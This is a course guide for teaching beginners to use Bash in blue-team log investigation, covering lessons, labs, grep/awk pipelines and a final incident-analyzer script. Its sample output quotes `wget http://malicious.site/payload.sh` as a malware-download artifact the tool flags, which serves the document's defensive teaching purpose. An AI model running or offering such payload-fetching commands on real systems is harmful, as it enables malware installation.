# Bash for Blue-Team Investigation - Course Implementation Guide

## Strategic Intent

This course is designed to take students with little or no Linux experience and make them operationally capable of using Bash for cybersecurity investigation.

The focus is not Bash programming depth. The focus is blue-team investigation workflow:

1. Identify suspicious activity.
2. Search large log sets.
3. Extract relevant fields.
4. Correlate attacker artifacts.
5. Reconstruct an attack timeline.
6. Automate repeatable investigation tasks.

The lab design intentionally uses large logs so students must use pipelines and scripts instead of manual reading.

## Final Deliverable

Students produce and use `incident_analyzer.sh`.

Expected capabilities:

- identify attacker IPs
- count brute force attempts
- detect compromised accounts
- build attack timelines
- locate suspicious commands
- identify likely malware downloads

Example usage:

```bash
./incident_analyzer.sh auth.log --top-ips
./incident_analyzer.sh auth.log --timeline
./incident_analyzer.sh access.log --suspicious-downloads
```

Representative output:

```text
=========================
 Incident Investigation
=========================

Top Attacker IP
185.220.101.4

Total Failed Logins
403

Compromised Account
admin

Suspicious Activity
wget http://malicious.site/payload.sh
```

## Teaching Philosophy

The course emphasizes practical problem solving over memorization.

Each lesson answers operational questions such as:

- Who attacked the server?
- What account was compromised?
- What command downloaded malware?

Core principles:

- minimal lecture
- heavy hands-on labs
- realistic investigative scenarios
- progressively harder challenges

## Learning Progression

### Stage 1 - Terminal Survival

Students build confidence with Linux navigation and log viewing.

Core commands:

```bash
pwd
ls
cd
cat
less
head
tail
wc
```

Goal: remove terminal anxiety and establish speed.

### Stage 2 - Log Investigation

Students identify evidence using text-processing tools.

Core tools:

```bash
grep
sort
uniq
awk
sed
```

Example:

```bash
grep "Failed password" auth.log | awk '{print $11}'
```

Goal: teach pipeline thinking.

### Stage 3 - Automation

Students convert manual workflows into repeatable scripts.

Skills:

- variables
- arguments
- loops
- simple functions

Example:

```bash
./incident_analyzer.sh auth.log --top-ips
```

Goal: produce useful investigation automation.

## 16-Hour Lesson Architecture

1. Linux Terminal Basics
2. Working With Logs
3. Searching Logs with `grep`
4. Pipelines and Redirection
5. Field Extraction with `awk`, `sort`, `uniq`
6. Threat Hunting Techniques
7. Bash Scripting for Investigations
8. Automation and Final Tool Integration

## Hands-On Labs

1. Terminal Navigation
2. Log Exploration
3. Failed Login Detection
4. Attacker IP Identification
5. Malware Command Investigation
6. Attack Timeline Reconstruction
7. First Automation Script
8. Final Incident Investigation

## Supporting Infrastructure

Operational components:

- setup script to provision full class environment
- advanced breach generator to build realistic datasets
- live attack simulator for real-time analysis drills
- guided labs and solution scripts

Environment assumptions:

- Linux VM or WSL
- Bash shell
- standard GNU core utilities

## Instructor Operating Model

Instructor responsibilities:

1. Have students run setup script.
2. Confirm logs and tools exist.
3. Deliver labs in sequence.
4. Coach investigation method and pipeline design.
5. Evaluate final script and investigation answers.

## Student Outcomes

By course end, students can:

- navigate Linux comfortably
- investigate large logs quickly
- extract meaningful security indicators
- correlate attacker artifacts across logs
- reconstruct breach timelines
- automate repetitive investigations

These outcomes map directly to entry-level SOC analyst tasks.

## Core Message

Bash is not only a shell interface. It is a fast, practical forensic investigation tool that turns large logs into actionable intelligence.
